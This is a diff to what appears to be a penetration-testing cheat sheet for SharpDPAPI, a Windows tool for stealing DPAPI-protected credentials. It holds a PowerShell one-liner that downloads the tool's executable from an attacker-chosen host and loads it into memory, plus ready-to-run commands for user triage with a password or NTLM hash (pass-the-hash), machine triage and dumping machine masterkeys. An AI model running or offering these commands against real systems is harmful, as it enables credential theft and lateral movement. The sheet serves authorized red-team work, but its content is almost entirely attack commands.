@@ -3,6 +3,24 @@
 % SharpDPAPI, dpapi
 #plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/DPAPI 
 
+## _desc
+```
+C# port of some DPAPI functionality from @gentilkiwi's Mimikatz project
+```
+
+## _repo
+```
+https://github.com/GhostPack/SharpDPAPI
+```
+
+## _doc
+```
+```
+
+## _install
+```
+```
+
 ## bin - download into memory
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/windows/NetFramework_4.7_x64/SharpDPAPI.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
@@ -17,23 +35,23 @@ $params="<cmd>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-
 Invoke-SharpDPAPI "<cmd>"
 ```
 
-## bin - user triage (creds)
+## user-triage - user (creds)
 ```powershell
 SharpDPAPI.exe triage /password:<password>
 ```
 
-## bin - user triage (pth)
+## user-triage - user (pth)
 ```powershell
 SharpDPAPI.exe triage /ntlm:<nt_hash>
 ```
 
-## bin - machine triage (creds)
+## machine-triage - all reachable machine masterkey 
 ```powershell
-SharpDPAPI.exe machinetriage /password:<password>
+SharpDPAPI.exe machinemasterkeys 
 ```
 
-## bin - machine triage (pth)
+## machine-triage - all
 ```powershell
-SharpDPAPI.exe machinetriage /ntlm:<nt_hash>
+SharpDPAPI.exe machinetriage
 ```
 
